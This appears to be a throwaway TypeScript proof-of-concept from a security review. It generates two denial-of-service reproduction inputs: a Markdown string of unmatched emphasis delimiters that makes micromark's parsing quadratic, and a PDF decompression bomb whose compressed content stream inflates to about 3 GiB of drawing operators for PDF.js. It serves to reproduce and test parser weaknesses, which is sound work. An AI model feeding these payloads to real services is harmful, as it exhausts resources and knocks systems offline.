// I02B-T01 PoC (throwaway, not product code): regenerates the two reproduction inputs the
// I02-A review measured (I02B-R25, G13). Same options give the same bytes; nothing is
// committed as a file.
//   - slow Markdown: a `_*a` run of unmatched emphasis delimiters, so micromark's emphasis
//     resolution goes quadratic (24 KB for the default 8,000 units; picked among a dozen
//     delimiter patterns timed on this machine, the slowest of them)
//   - PDF bomb: one page whose content stream is a FlateDecode stream that inflates to
//     `inflatedBytes` of `q Q ` operators (about 1000:1, 3 GiB for 3.1 MB), so PDF.js inflates
//     and interprets all of it. Whitespace alone was measured too: 512 MiB took 4.9 s, but the
//     same size of operators took minutes, so the operator fill is the reproduction
import { createHash } from "node:crypto";
import { createDeflate } from "node:zlib";

export function makeSlowMarkdown(units = 8_000): Uint8Array {
  return new TextEncoder().encode("_*a".repeat(units));
}

export async function makePdfBomb(
  inflatedBytes = 3 * 1024 ** 3,
  fill = "q Q ",
): Promise<Uint8Array> {
  const deflate = createDeflate({ level: 9 });
  const parts: Buffer[] = [];
  deflate.on("data", (chunk: Buffer) => parts.push(chunk));
  const done = new Promise<void>((resolve, reject) => {
    deflate.on("end", resolve);
    deflate.on("error", reject);
  });
  const block = Buffer.from(
    fill.repeat(Math.ceil(1024 ** 2 / fill.length)).slice(0, 1024 ** 2),
    "latin1",
  );
  for (let written = 0; written < inflatedBytes; written += block.length) {
    const piece = block.subarray(0, Math.min(block.length, inflatedBytes - written));
    if (!deflate.write(piece)) await new Promise((r) => deflate.once("drain", r));
  }
  deflate.end();
  await done;
  const stream = Buffer.concat(parts);

  const objects: Buffer[] = [];
  const text = (s: string) => Buffer.from(s, "latin1");
  objects.push(text("<< /Type /Catalog /Pages 2 0 R >>"));
  objects.push(text("<< /Type /Pages /Count 1 /Kids [3 0 R] >>"));
  objects.push(
    text(
      "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> /Contents 4 0 R >>",
    ),
  );
  objects.push(
    Buffer.concat([
      text(`<< /Length ${stream.length} /Filter /FlateDecode >>\nstream\n`),
      stream,
      text("\nendstream"),
    ]),
  );
  const out: Buffer[] = [text("%PDF-1.4\n")];
  const offsets: number[] = [];
  let at = out.reduce((n, b) => n + b.length, 0);
  objects.forEach((body, i) => {
    offsets.push(at);
    const piece = Buffer.concat([text(`${i + 1} 0 obj\n`), body, text("\nendobj\n")]);
    out.push(piece);
    at += piece.length;
  });
  const xref =
    `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n` +
    offsets.map((o) => `${String(o).padStart(10, "0")} 00000 n \n`).join("") +
    `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${at}\n%%EOF\n`;
  out.push(text(xref));
  return new Uint8Array(Buffer.concat(out));
}

export const sha256 = (bytes: Uint8Array): string =>
  createHash("sha256").update(bytes).digest("hex");

// run as a script only when this file is the entry (not when bundled into another entry)
if (import.meta.main && import.meta.filename.endsWith("repro-inputs.ts")) {
  // G13: both functions rebuild the same bytes twice; sizes are the ones the spec names
  const inflated = Number(process.argv[2] ?? 3 * 1024 ** 3);
  const md1 = makeSlowMarkdown();
  const md2 = makeSlowMarkdown();
  console.log(
    `markdown bytes=${md1.length} sha256=${sha256(md1)} same-on-rebuild=${sha256(md1) === sha256(md2)}`,
  );
  const t = performance.now();
  const p1 = await makePdfBomb(inflated);
  const s = (performance.now() - t) / 1000;
  const p2 = await makePdfBomb(inflated);
  console.log(
    `pdf bytes=${p1.length} (${(p1.length / 1024 ** 2).toFixed(2)} MiB) inflates-to=${inflated} sha256=${sha256(p1)} same-on-rebuild=${sha256(p1) === sha256(p2)} build-seconds=${s.toFixed(1)}`,
  );
}
